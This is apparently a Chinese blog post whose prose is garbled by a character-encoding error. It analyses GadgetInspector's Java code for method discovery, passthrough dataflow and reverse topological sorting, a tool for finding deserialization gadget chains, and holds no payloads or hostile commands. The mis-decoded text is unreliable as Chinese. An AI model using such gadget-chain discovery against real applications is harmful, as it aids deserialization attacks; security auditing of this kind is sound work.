variablesï¼ˆä¸€ä¸ªç´¢å¼•ä»0å¼€å§‹çš„æ•°ç»„ï¼‰å’Œoperand stackï¼ˆæ ˆçš„ç»“æ„ï¼‰ã€‚å¯¹äºæ¯ä¸€ä¸ªæ–¹æ³•æ¥è¯´ï¼Œå®ƒéƒ½æ˜¯åœ¨è‡ªå·±çš„Stack Frameä¸Šæ¥è¿è¡Œçš„ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œå°±å†³å®šäº†local variableså’Œoperand stackçš„å¤§å°ã€‚ è¿™é‡Œç‰¹åˆ«è¦æ³¨æ„åœ¨æ–¹æ³•åˆšå¼€å§‹çš„æ—¶å€™ï¼Œoperand stackæ˜¯ç©ºï¼Œä¸éœ€è¦å­˜å‚¨ä»»ä½•çš„æ•°æ®ï¼Œè€Œlocal variablesçš„åˆå§‹çŠ¶æ€ï¼Œåˆ™éœ€è¦è€ƒè™‘ä¸‰ä¸ªå› ç´ ï¼š å½“å‰æ–¹æ³•æ˜¯å¦ä¸ºstaticæ–¹æ³•ã€‚å¦‚æœå½“å‰æ–¹æ³•æ˜¯non-staticæ–¹æ³•ï¼Œåˆ™éœ€è¦åœ¨local variablesç´¢å¼•ä¸º0çš„ä½ç½®å­˜åœ¨ä¸€ä¸ªthiså˜é‡ï¼›å¦‚æœå½“å‰æ–¹æ³•æ˜¯staticæ–¹æ³•ï¼Œåˆ™ä¸éœ€è¦å­˜å‚¨thisã€‚ å½“å‰æ–¹æ³•æ˜¯å¦æ¥æ”¶å‚æ•°ã€‚æ–¹æ³•æ¥æ”¶çš„å‚æ•°ï¼Œä¼šæŒ‰ç…§å‚æ•°çš„å£°æ˜é¡ºåºæ”¾åˆ°local variableså½“ä¸­ã€‚ æ–¹æ³•å‚æ•°æ˜¯å¦åŒ…å«longæˆ–doubleç±»å‹ã€‚å¦‚æœæ–¹æ³•çš„å‚æ•°æ˜¯longæˆ–doubleç±»å‹ï¼Œé‚£ä¹ˆå®ƒåœ¨local variableså½“ä¸­å ç”¨ä¸¤ä¸ªä½ç½®ã€‚ è¿™é‡Œæ¨èä¸€ä¸ªIDEAçš„æ’ä»¶ASM Bytecode Viewerï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿é…åˆå­¦ä¹ ç†è§£ï¼ŒåŒæ—¶å¦‚æœéœ€è¦æŸ¥å½“ä¸­çš„æ±‡ç¼–æŒ‡ä»¤çš„å«ä¹‰ä¹Ÿå¾ˆç®€å•ï¼Œå»å®˜ç½‘çœ‹çœ‹å°±å¥½https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-6.html ClassVisitoræˆ‘ä»¬åªè¦çŸ¥é“åœ¨ClassVisitorç±»å½“ä¸­ï¼Œå®šä¹‰çš„visitXxx()æ–¹æ³•ä¸­çš„å‚æ•°ä¸ClassFileç»“æ„å¯†åˆ‡ç›¸å…³å°±å¾ˆå…³é”®äº† é¦–å…ˆçœ‹çœ‹é‡Œé¢çš„å­—æ®µ 123456public abstract class ClassVisitor &#123; //æŒ‡å‡ºäº†å½“å‰ä½¿ç”¨çš„ASM APIç‰ˆæœ¬ protected final int api; //ä¸€ä¸ªClassVisitorç±»å‹çš„æ•°æ®ï¼Œå¯ä»¥å°†å¤šä¸ªClassVisitorä¸²è¿èµ·æ¥ protected ClassVisitor cv;&#125; ClassVisitorå½“ä¸­è®¸å¤šçš„visitXxx()æ–¹æ³•ï¼Œè¿™äº›visitXxx()æ–¹æ³•ä¸ClassFileçš„ç»“æ„å¯†åˆ‡ç›¸å…³ï¼Œè€Œè¿™ä¸‹é¢å››ä¸ªæ‰æ˜¯æˆ‘ä»¬å…³æ³¨çš„ä¸»ä½“ 12345678910111213141516171819202122public abstract class ClassVisitor &#123; public void visit( final int version, final int access, final String name, final String signature, final String superName, final String[] interfaces); public FieldVisitor visitField( // è®¿é—®å­—æ®µ final int access, final String name, final String descriptor, final String signature, final Object value); public MethodVisitor visitMethod( // è®¿é—®æ–¹æ³• final int access, final String name, final String descriptor, final String signature, final String[] exceptions); public void visitEnd();&#125; å…¶ä¸­signatureä¸ºç±»ç­¾åï¼ˆéæ³›å‹ä¸ºNUllï¼‰ï¼ŒåŒæ—¶visitXxx()æ–¹æ³•ï¼Œä¹Ÿæœ‰è°ƒç”¨é¡ºåºï¼Œäº†è§£ä¸‹å°±å¥½ï¼Œç»“åˆè¿™ä¸ªè°ƒç”¨é¡ºåºï¼ŒGIçš„è¿™éƒ¨åˆ†ä»£ç å°±å¾ˆå¥½æ‡‚äº† 123456789101112131415visit[visitSource][visitModule][visitNestHost][visitPermittedSubclass][visitOuterClass]( visitAnnotation | visitTypeAnnotation | visitAttribute)*( visitNestMember | visitInnerClass | visitRecordComponent | visitField | visitMethod)* visitEnd MethodVisitorå’Œä¸Šé¢å¾ˆå¤šéƒ¨åˆ†ç›¸ä¼¼ï¼Œæˆ‘ä»¬ç›´æ¥å…¥æ­£æ–‡ï¼Œä¹Ÿæ˜¯æœ‰å¾ˆå¤šå…³é”®çš„visitxxxæ–¹æ³•ï¼Œå¯¹ä¸€äº›æˆ‘ä»¬éœ€è¦çš„åšä¸ªç²¾ç®€çš„è°ƒç”¨ï¼Œçœ‹è‹±æ–‡åç§°å°±èƒ½çŸ¥é“æ„æ€å°±ä¸å¤šè¯´æ¯ä¸ªéƒ¨åˆ†äº† 123456789101112131415161718(visitParameter)*[visitAnnotationDefault](visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation | visitTypeAnnotation | visitAttribute)*[ visitCode ( visitFrame//è®¿é—®å½“å‰å±€éƒ¨å˜é‡è¡¨å’Œæ“ä½œæ•°æ ˆä¸­å…ƒç´ çš„çŠ¶æ€ï¼Œå‚æ•°å°±æ˜¯å±€éƒ¨å˜é‡è¡¨å’Œæ“ä½œæ•°æ ˆçš„å†…å®¹ | visitXxxInsn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )* visitMaxs] è¿™é‡Œä¸»è¦è®°å½•ä¸‹visitxxxInsn 123456visitFieldInsn ï¼š è®¿é—®æŸä¸ªæˆå‘˜å˜é‡çš„æŒ‡ä»¤ï¼Œæ”¯æŒGETSTATIC, PUTSTATIC, GETFIELD or PUTFIELD.visitIincInsn ï¼š è®¿é—®è‡ªå¢æŒ‡ä»¤visitVarInsn ï¼šè®¿é—®å±€éƒ¨å˜é‡æŒ‡ä»¤ï¼Œå°±æ˜¯å–å±€éƒ¨å˜é‡å˜çš„å€¼æ”¾å…¥æ“ä½œæ•°æ ˆvisitMethodInsn ï¼šè®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œå°±æ˜¯è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œæ”¯æŒINVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC or INVOKEINTERFACE.visitInsn ï¼š è®¿é—®æ— æ“ä½œæ•°çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚nopï¼Œduoç­‰ç­‰visitTypeInsnï¼šè®¿é—®typeæŒ‡ä»¤ï¼Œå³å°†ä¸€ä¸ªç±»çš„å…¨é™å®šåä½œä¸ºå‚æ•°ç„¶ånewä¸€ä¸ªå¯¹è±¡å‹å…¥æ“ä½œæ•°æ ˆä¸­ åœ¨GIå½“ä¸­æˆ‘ä»¬ä¸»è¦å…³å¿ƒvisitMethodInsnï¼Œé¡ºä¾¿è¯´ä¸€äº›ç›¸å…³æŒ‡ä»¤å…¶ä¸­invokestaticç”¨æ¥è°ƒç”¨é™æ€æ–¹æ³•ï¼›invokespecialç”¨æ¥è°ƒç”¨ç§æœ‰æ–¹æ³•ï¼Œçˆ¶ç±»æ–¹æ³•(super.)ï¼Œç±»æ„é€ å™¨æ–¹æ³•ï¼›invokeinterfaceè°ƒç”¨æ¥å£æ–¹æ³•ï¼›invokedynamicæ–¹æ³•åŠ¨æ€æ‰§è¡Œï¼›invokevirtualè°ƒç”¨æ‰€æœ‰è™šæ–¹æ³•ï¼Œå³é™¤äº†ä»¥ä¸Šçš„æ–¹æ³•å¤–å…¨ç”¨invokevirtualè°ƒç”¨ã€‚ åˆ†æä¸‹é¢æ ¹æ®æµç¨‹åˆ†æå…·ä½“çš„ç±»å½“ä¸­çš„æ“ä½œ MethodDiscoveryè¿™ä¸ªæ–¹æ³•ä¸»è¦æ˜¯è·å¾—ç±»ä»¥åŠæ–¹æ³•çš„ä¿¡æ¯ å…¶ä¸­åœ¨methods.daté‡Œé¢æŒ‰ç…§æŒ‡å®šæ ¼å¼è®°å½•ï¼šç±»åã€æ–¹æ³•åã€å‚æ•°ä»¥åŠè¿”å›å€¼ã€æ˜¯å¦ä¸ºé™æ€æ–¹æ³• åœ¨classes.daté‡Œé¢æŒ‰ç…§æŒ‡å®šæ ¼å¼è®°å½•ï¼šç±»åã€çˆ¶ç±»åã€å®ç°çš„æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ã€ç±»çš„æ‰€æœ‰å­—æ®µã€æ³¨è§£å çœ‹äº†ä¸‹mainå‡½æ•°çš„ä¸»ä½“ 1234ClassLoader classLoader = Util.getWarClassLoader(Paths.get(&quot;/Users/y4tacker/Desktop/test/shorter-0.0.1-SNAPSHOT.jar&quot;));MethodDiscovery methodDiscovery = new MethodDiscovery();methodDiscovery.discover(new ClassResourceEnumerator(classLoader));methodDiscovery.save(); é¦–å…ˆç¬¬ä¸€è¡Œçš„gadgetinspector.Util#getWarClassLoaderä¸æ˜¯å¾ˆéš¾ä¸è´´ä»£ç äº†ï¼Œé¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œé€šè¿‡addShutdownHookåœ¨jvm shutdownè‡ªåŠ¨åˆ é™¤ï¼Œä¹‹åå°†jar/warçš„æ–‡ä»¶è§£å‹åˆ°ä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¹¶é…ç½®/èµ„æºæ–‡ä»¶çš„è·¯å¾„ï¼Œå¹¶è¿”å›URLClassLoader ä¹‹åè°ƒç”¨gadgetinspector.MethodDiscovery#discoverï¼Œå¯ä»¥çœ‹å‡ºé€šè¿‡foreachéå†ï¼Œä¹‹åä½¿ç”¨asmçš„ClassVisitorã€MethodVisitorï¼Œåˆ©ç”¨è§‚å¯Ÿæ¨¡å¼å»æ‰«ææ‰€æœ‰çš„classå’Œmethodå¹¶è®°å½• 123456789101112131415public void discover(final ClassResourceEnumerator classResourceEnumerator) throws Exception &#123; for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123; try (InputStream in = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(in); try &#123; //ä½¿ç”¨asmçš„ClassVisitorã€MethodVisitorï¼Œåˆ©ç”¨è§‚å¯Ÿæ¨¡å¼å»æ‰«ææ‰€æœ‰çš„classå’Œmethodå¹¶è®°å½• cr.accept(new MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES); &#125; catch (Exception e) &#123; LOGGER.error(&quot;Exception analyzing: &quot; + classResource.getName(), e); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; è°ƒç”¨gadgetinspector.ClassResourceEnumerator#getAllClassesï¼Œé¦–å…ˆé‡Œé¢è°ƒç”¨äº†*getRuntimeClasses()*å‡½æ•° å¯ä»¥çœ‹åˆ°æ ¸å¿ƒä»£ç  1234567891011URL stringClassUrl = Object.class.getResource(&quot;String.class&quot;);URLConnection connection = stringClassUrl.openConnection();Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;();if (connection instanceof JarURLConnection) &#123; URL runtimeUrl = ((JarURLConnection) connection).getJarFileURL(); URLClassLoader classLoader = new URLClassLoader(new URL[]&#123;runtimeUrl&#125;); for (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123; result.add(new ClassLoaderClassResource(classLoader, classInfo.getResourceName())); &#125;&#125; ä»–å…ˆè·å–JDKå†…éƒ¨çš„Stringç±»çš„è·¯å¾„ï¼ŒåŠ è½½Stringç±»çš„åŒæ—¶ï¼Œç±»åŠ è½½å™¨è¿˜ä¼šå°†rt.jarçš„å…¨éƒ¨ç±»ä¸€èµ·åŠ è½½ï¼Œæœ€åå°†rt.jarå½“ä¸­çš„æ‰€æœ‰ç±»åŠ å…¥åˆ°ClassResourceç±»å‹çš„resultå¹¶ä¸”è¿”å› ä¹‹åä¹Ÿå°±æ˜¯ä¸€ä¸ªç»§æ‰¿äº†ClassVisitorçš„MethodDiscoveryClassVisitoråˆ†åˆ«åœ¨visitMethodå’ŒvisitEndä¾æ¬¡æ·»åŠ æ–¹æ³•å’Œç±»åˆ°ç¼“å­˜ ä¹‹åå°±æ˜¯è°ƒç”¨saveæ–¹æ³•ä¿å­˜åˆ°æ–‡ä»¶ 1234567891011121314151617181920public void save() throws IOException &#123; //ä¿å­˜å’Œè¯»å–ä½¿ç”¨Factoryå®ç° //classes.datæ•°æ®æ ¼å¼ï¼š //ç±»å(ä¾‹ï¼šjava/lang/String) çˆ¶ç±» æ¥å£A,æ¥å£B,æ¥å£C æ˜¯å¦æ¥å£ å­—æ®µ1!å­—æ®µ1access!å­—æ®µ1ç±»å‹!å­—æ®µ2!å­—æ®µ2access!å­—æ®µ1ç±»å‹ DataLoader.saveData(Paths.get(&quot;classes.dat&quot;), new ClassReference.Factory(), discoveredClasses); //methods.datæ•°æ®æ ¼å¼ï¼š //ç±»å æ–¹æ³•å æ–¹æ³•æè¿° æ˜¯å¦é™æ€æ–¹æ³• DataLoader.saveData(Paths.get(&quot;methods.dat&quot;), new MethodReference.Factory(), discoveredMethods); //å½¢æˆ ç±»å(ClassReference.Handle)-&gt;ç±»(ClassReference) çš„æ˜ å°„å…³ç³» Map&lt;ClassReference.Handle, ClassReference&gt; classMap = new HashMap&lt;&gt;(); for (ClassReference clazz : discoveredClasses) &#123; classMap.put(clazz.getHandle(), clazz); &#125; //ä¿å­˜classes.datå’Œmethods.datçš„åŒæ—¶ï¼Œå¯¹æ‰€æœ‰çš„classè¿›è¡Œé€’å½’æ•´åˆï¼Œå¾—åˆ°é›†åˆ&#123;class:[subclass]&#125;ï¼Œ // é€’å½’å¯»æ‰¾classçš„çˆ¶ç±»ã€è¶…ç±»æˆ–å®ç°çš„æ¥å£ç±»ï¼Œä¿å­˜è‡³inheritanceMap.dat InheritanceDeriver.derive(classMap).save();&#125; PassthroughDiscoveryè¿™ä¸ªç±»ç”¨æ¥å¯»æ‰¾å‡½æ•°çš„ç¬¬å‡ ä¸ªå‚æ•°èƒ½æ§åˆ¶è¿”å›å€¼ï¼š 0ä»£è¡¨thisã€1-nåˆ†åˆ«ä»£è¡¨ç¬¬å‡ ä¸ªå‡½æ•°å½“ä¸­çš„å½¢å‚ æˆ‘ä»¬ä¸»è¦æ¥å…³æ³¨gadgetinspector.PassthroughDiscovery#discoverï¼Œå…ˆç®€å•çœ‹çœ‹é€»è¾‘ 12345678910111213141516171819202122public void discover(final ClassResourceEnumerator classResourceEnumerator, final GIConfig config) throws IOException &#123; //åŠ è½½æ–‡ä»¶è®°å½•çš„æ‰€æœ‰æ–¹æ³•ä¿¡æ¯ Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); //åŠ è½½æ–‡ä»¶è®°å½•çš„æ‰€æœ‰ç±»ä¿¡æ¯ Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses(); //åŠ è½½æ–‡ä»¶è®°å½•çš„æ‰€æœ‰ç±»ç»§æ‰¿ã€å®ç°å…³è”ä¿¡æ¯ InheritanceMap inheritanceMap = InheritanceMap.load(); //æœç´¢æ–¹æ³•é—´çš„è°ƒç”¨å…³ç³»ï¼Œç¼“å­˜è‡³methodCallsé›†åˆï¼Œè¿”å› ç±»å-&gt;ç±»èµ„æº æ˜ å°„é›†åˆ Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator); //å¯¹æ–¹æ³•è°ƒç”¨å…³ç³»è¿›è¡Œå­—å…¸æ’åº List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls(); /** * classResourceByNameï¼šç±»èµ„æºé›†åˆ * classMapï¼šç±»ä¿¡æ¯é›†åˆ * inheritanceMapï¼šç»§æ‰¿ã€å®ç°å…³ç³»é›†åˆ * sortedMethodsï¼šæ–¹æ³•é›†åˆ * SerializableDeciderï¼šå†³ç­–è€… */ passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods, config.getSerializableDecider(methodMap, inheritanceMap));&#125; è·³è¿‡åŠ è½½æ–‡ä»¶çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬æ¥çœ‹gadgetinspector.PassthroughDiscovery#discoverMethodCalls 12345678910111213141516private Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(final ClassResourceEnumerator classResourceEnumerator) throws IOException &#123; Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = new HashMap&lt;&gt;(); for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123; try (InputStream in = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(in); try &#123; MethodCallDiscoveryClassVisitor visitor = new MethodCallDiscoveryClassVisitor(Opcodes.ASM6); cr.accept(visitor, ClassReader.EXPAND_FRAMES); classResourcesByName.put(visitor.getName(), classResource); &#125; catch (Exception e) &#123; LOGGER.error(&quot;Error analyzing: &quot; + classResource.getName(), e); &#125; &#125; &#125; return classResourcesByName;&#125; å¾ˆç›¸ä¼¼ç›´æ¥è·Ÿè¿›MethodCallDiscoveryClassVisitorï¼Œå…¶ä¸­é‡è¦çš„æ˜¯gadgetinspector.PassthroughDiscovery.MethodCallDiscoveryClassVisitor#visitMethod 123456789public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) &#123; MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions); //åœ¨visitæ¯ä¸ªmethodçš„æ—¶å€™ï¼Œåˆ›å»ºMethodVisitorå¯¹methodè¿›è¡Œè§‚å¯Ÿ MethodCallDiscoveryMethodVisitor modelGeneratorMethodVisitor = new MethodCallDiscoveryMethodVisitor( api, mv, this.name, name, desc); return new JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);&#125; åœ¨MethodCallDiscoveryMethodVisitorå†…é‡å†™äº†MethodCallDiscoveryMethodVisitorçš„visitMethodInsnæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨æ–¹æ³•å†…è°ƒç”¨å…¶ä»–æ–¹æ³•æ—¶ï¼Œä¼šæŠŠæ–¹æ³•çš„ç›¸å…³ä¿¡æ¯ç¼“å­˜åˆ°calledMethods å¹¶ä¸”è¿™ä¸ªcalledMethodsä¹‹å‰åœ¨MethodCallDiscoveryMethodVisitorçš„åˆå§‹åŒ–æ„é€ å‡½æ•°å½“ä¸­å°†calledMethodsçš„å¼•ç”¨ä¹Ÿæ”¾åˆ°äº†ç±»çš„æˆå‘˜å˜é‡methodCallså½“ä¸­ 12345678public MethodCallDiscoveryMethodVisitor(final int api, final MethodVisitor mv, final String owner, String name, String desc) &#123; super(api, mv); //åˆ›å»ºcalledMethodæ”¶é›†è°ƒç”¨åˆ°çš„methodï¼Œæœ€åå½¢æˆé›†åˆ&#123;&#123;sourceClass,sourceMethod&#125;:[&#123;targetClass,targetMethod&#125;]&#125; this.calledMethods = new HashSet&lt;&gt;(); methodCalls.put(new MethodReference.Handle(new ClassReference.Handle(owner), name, desc), calledMethods);&#125; æ¥ä¸‹æ¥å°±æ˜¯æœ€é‡è¦çš„é€†æ‹“æ‰‘æ’åºtopologicallySortMethodCallsï¼Œè¿™ä¸ªæ­¥éª¤å¯¹äºæˆ‘ä»¬ä¹‹åæ±¡ç‚¹è·Ÿè¸ªéå¸¸é‡è¦ï¼Œå¯ä»¥çœ‹çœ‹çŸ¥é“åˆ›å®‡404çš„æ–‡ç« éå¸¸å¥½ï¼Œè¿™é‡Œä¸ºäº†æ–‡ç« æ¸…æ™°å°†ç›´æ¥å¤åˆ¶ç›¸å…³éƒ¨åˆ† 123456789101112131415161718192021private List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123; Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = new HashMap&lt;&gt;(); for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123; MethodReference.Handle method = entry.getKey(); outgoingReferences.put(method, new HashSet&lt;&gt;(entry.getValue())); &#125; // Topological sort methods LOGGER.debug(&quot;Performing topological sort...&quot;); Set&lt;MethodReference.Handle&gt; dfsStack = new HashSet&lt;&gt;(); Set&lt;MethodReference.Handle&gt; visitedNodes = new HashSet&lt;&gt;(); List&lt;MethodReference.Handle&gt; sortedMethods = new ArrayList&lt;&gt;(outgoingReferences.size()); for (MethodReference.Handle root : outgoingReferences.keySet()) &#123; //éå†é›†åˆä¸­çš„èµ·å§‹æ–¹æ³•ï¼Œè¿›è¡Œé€’å½’æœç´¢DFSï¼Œé€šè¿‡é€†æ‹“æ‰‘æ’åºï¼Œè°ƒç”¨é“¾çš„æœ€æœ«ç«¯æ’åœ¨æœ€å‰é¢ï¼Œ // è¿™æ ·æ‰èƒ½å®ç°å…¥å‚ã€è¿”å›å€¼ã€å‡½æ•°è°ƒç”¨é“¾ä¹‹é—´çš„æ±¡ç‚¹å½±å“ dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root); &#125; LOGGER.debug(String.format(&quot;Outgoing references %d, sortedMethods %d&quot;, outgoingReferences.size(), sortedMethods.size())); return sortedMethods;&#125; åœ¨ä»£ç å½“ä¸­ï¼Œé¦–å…ˆæœ‰ä¸‰ä¸ªé‡è¦çš„å˜é‡ dfsStackï¼šç”¨æ¥åˆ†ææ–¹æ³•è°ƒç”¨é¡ºåºï¼Œä¿è¯åœ¨é€†æ‹“æ‰‘æ—¶å€™ä¸å½¢æˆç¯ visitedNodesï¼šè®¿é—®è¿‡çš„ç»“ç‚¹ï¼Œåœ¨ä¸€æ¡è°ƒç”¨é“¾å‡ºç°é‡åˆçš„æ—¶å€™ï¼Œä¸ä¼šé€ æˆé‡å¤çš„æ’åº sortedMethodsï¼šæœ€ç»ˆé€†æ‹“æ‰‘æ’åºå‡ºæ¥çš„ç»“æœ æ¥ä¸‹æ¥æˆ‘ä»¬è¯¦ç»†çœ‹çœ‹dfsTsortï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ 12345678910111213141516171819202122232425private static void dfsTsort(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences, List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes, Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node) &#123; if (stack.contains(node)) &#123; return; &#125; if (visitedNodes.contains(node)) &#123; return; &#125; //æ ¹æ®èµ·å§‹æ–¹æ³•ï¼Œå–å‡ºè¢«è°ƒç”¨çš„æ–¹æ³•é›† Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node); if (outgoingRefs == null) &#123; return; &#125; //å…¥æ ˆï¼Œä»¥ä¾¿äºé€’å½’ä¸é€ æˆç±»ä¼¼å¾ªç¯å¼•ç”¨çš„æ­»å¾ªç¯æ•´åˆ stack.add(node); for (MethodReference.Handle child : outgoingRefs) &#123; dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child); &#125; stack.remove(node); visitedNodes.add(node);//è®°å½•å·²è¢«æ¢ç´¢è¿‡çš„æ–¹æ³•ï¼Œç”¨äºåœ¨ä¸Šå±‚è°ƒç”¨é‡åˆ°é‡å¤æ–¹æ³•æ—¶å¯ä»¥è·³è¿‡ sortedMethods.add(node);//é€’å½’å®Œæˆçš„æ¢ç´¢ï¼Œä¼šæ·»åŠ è¿›æ¥&#125; ä¸ºäº†é˜²æ­¢åœ¨é€†æ‹“æ‰‘æ’åºå½¢æˆç¯ï¼Œå¯¹äºå¾…åˆ†æçš„æ–¹æ³•ï¼Œå¦‚æœåœ¨stacké‡Œé¢ï¼Œåˆ™ä¸å†å…¥æ ˆäº†ï¼Œå¦‚æœä¹‹å‰å·²ç»åˆ†æè¿‡æŸæ–¹æ³•ï¼Œä¹Ÿä¸ä¼šå†å…¥æ ˆï¼Œä¹‹åå–å‡ºè¢«è°ƒç”¨çš„å­æ–¹æ³•é›†ï¼Œéå†è¿™ä¸ªå­æ–¹æ³•é›†é€’å½’è°ƒç”¨dfsTsortï¼Œæœ€åå°†ç»“æœä¿å­˜åˆ°sortedMethods æ¯”è¾ƒå½¢è±¡çš„è¿‡ç¨‹çœ‹åˆ›å®‡é‡Œçš„å›¾ï¼Œé…åˆç†è§£ä»£ç å°±ä¸éš¾äº† å¯¹ä¸Šå›¾è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼ˆDFSæ–¹å¼ï¼‰ï¼š ä»med1å¼€å§‹ï¼Œå…ˆå°†med1åŠ å…¥stackä¸­ï¼Œæ­¤æ—¶stackã€visitedã€sortedmethodsçŠ¶æ€å¦‚ä¸‹ï¼š med1è¿˜æœ‰å­æ–¹æ³•ï¼Ÿæœ‰ï¼Œç»§ç»­æ·±åº¦éå†ã€‚å°†med2æ”¾å…¥stackï¼Œæ­¤æ—¶çš„çŠ¶æ€ï¼š med3æœ‰å­æ–¹æ³•å—ï¼Ÿæœ‰ï¼Œç»§ç»­æ·±åº¦éå†ã€‚å°†med7æ”¾å…¥stackï¼Œæ­¤æ—¶çš„çŠ¶æ€ï¼š med7æœ‰å­æ–¹æ³•å—ï¼Ÿæ²¡æœ‰ï¼Œä»stackä¸­å¼¹å‡ºmed7å¹¶åŠ å…¥visitedå’Œsortedmethodsï¼Œæ­¤æ—¶çš„çŠ¶æ€ï¼š å›æº¯åˆ°ä¸Šä¸€å±‚ï¼Œmed3è¿˜æœ‰å…¶ä»–å­æ–¹æ³•å—ï¼Ÿæœ‰ï¼Œmed8ï¼Œå°†med8æ”¾å…¥stackï¼Œæ­¤æ—¶çš„çŠ¶æ€ï¼š med8è¿˜æœ‰å­æ–¹æ³•å—ï¼Ÿæ²¡æœ‰ï¼Œå¼¹å‡ºstackï¼ŒåŠ å…¥visitedä¸sortedmethodsï¼Œæ­¤æ—¶çš„çŠ¶æ€ï¼š å›æº¯åˆ°ä¸Šä¸€å±‚ï¼Œmed3è¿˜æœ‰å…¶ä»–å­æ–¹æ³•å—ï¼Ÿæ²¡æœ‰äº†ï¼Œå¼¹å‡ºstackï¼ŒåŠ å…¥visitedä¸sortedmethodsï¼Œæ­¤æ—¶çš„çŠ¶æ€ï¼š ä¸€ç›´ç±»ä¼¼ä¸Šé¢çš„è¿‡ç¨‹ï¼Œå¾—åˆ°æœ€ç»ˆç»“æœï¼šmed7ã€med8ã€med3ã€med6ã€med2ã€med4ã€med1 ä¹‹åçš„è¿‡ç¨‹å°±æ˜¯è°ƒç”¨calculatePassthroughDataflowï¼Œå…¶ä¸­éå†äº†sortedmethodsï¼Œå¹¶é€šè¿‡å­—èŠ‚ç åˆ†æï¼Œç”Ÿæˆäº†æ–¹æ³•è¿”å›å€¼ä¸å‚æ•°å…³ç³»çš„passthroughæ•°æ®æµ(passthroughDataflowä¸»è¦è´Ÿè´£å­˜å‚¨å‚æ•°æ±¡æŸ“ç»“æœï¼Œkeyå¯¹åº”æ–¹æ³•åï¼Œvalueå¯¹åº”çš„æ˜¯è¿™ä¸ªæ–¹æ³•ä¸­å¯ä»¥è¢«æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ)ï¼Œå†…ç½®äº†ä¸‰ç§ååºåˆ—åŒ–çš„ç­–ç•¥é…ç½®configç±»ï¼šJDKã€Jacksonã€Xstreamï¼Œè¿™é‡Œæˆ‘åªåˆ†æé»˜è®¤çš„JDKååºåˆ—åŒ–ï¼Œå…¶ä»–è¿‡ç¨‹éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œç»§ç»­å›åˆ°æ­£é¢˜ ï¼Œokè¿˜æ˜¯ä¸ºäº†å‡å°‘å¹²æ‰°ï¼Œæˆ‘åˆåœ¨å‡½æ•°é€»è¾‘ç¨ä½œä¿®æ”¹ï¼Œå› ä¸ºä¸Šæ–‡æåˆ°è¿‡æˆ‘ä»¬è·Ÿè¸ªçš„ä»£ç æ˜¯ 123456789101112131415161718192021222324252627package yyds;import java.io.IOException;public class Main &#123; public String main(String args) throws IOException &#123; String cmd = new A().method1(args); return new B().method2(cmd); &#125;&#125;class A &#123; public String method1(String param) &#123; return param; &#125;&#125;class B &#123; public String method2(String param) &#123; return new C().method3(param); &#125;&#125;class C &#123; public String method3(String param) &#123; return param; &#125;&#125; è‚‰çœ¼å¯å¾—ä¸æ„é€ å‡½æ•°æ— å…³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å…·ä½“çœ‹çœ‹å‡½æ•°calculatePassthroughDataflowåšäº†äº›ä»€ä¹ˆ æ ¹æ®ä»£ç é€»è¾‘æˆ‘ä»¬å¯ä»¥çœ‹å‡ºé¦–å…ˆä¼šè·³è¿‡é™æ€åˆå§‹åŒ–ä»£ç (å› ä¸ºé™æ€ä»£ç å—ä¸å‡ºæ„å¤–åŸºæœ¬ä¸Šæ˜¯æ²¡æ³•è¢«æ±¡æŸ“çš„) 